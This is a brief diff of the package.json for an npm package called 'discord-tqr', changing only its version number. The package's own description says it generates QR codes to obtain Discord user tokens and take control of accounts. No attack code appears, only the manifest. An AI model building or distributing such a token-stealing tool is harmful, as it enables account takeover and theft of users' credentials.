@@ -1,6 +1,6 @@
 {
   "name": "discord-tqr",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "description": "Generate QR code to get user token to take control of the account, get informations ...",
   "main": "./dist/index.js",
   "types": "./dist/index.d.ts",
